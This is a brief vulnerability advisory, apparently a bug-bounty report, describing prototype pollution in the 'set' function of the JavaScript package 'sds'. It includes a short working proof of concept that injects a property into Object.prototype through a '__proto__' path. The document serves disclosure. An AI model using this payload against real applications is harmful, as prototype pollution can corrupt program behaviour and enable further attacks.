# Overview

`sds` is a structured data search package this package are vulnerable to Prototype Pollution.

The library could be tricked into adding or modifying properties of the `Object.prototype` by abusing the `set` function located in `js/set.js`.

# Proof of Concept

```
var root = require("sds");
var payload = "__proto__.huntr";
root.set({}, payload, true);
console.log({}.huntr);
```
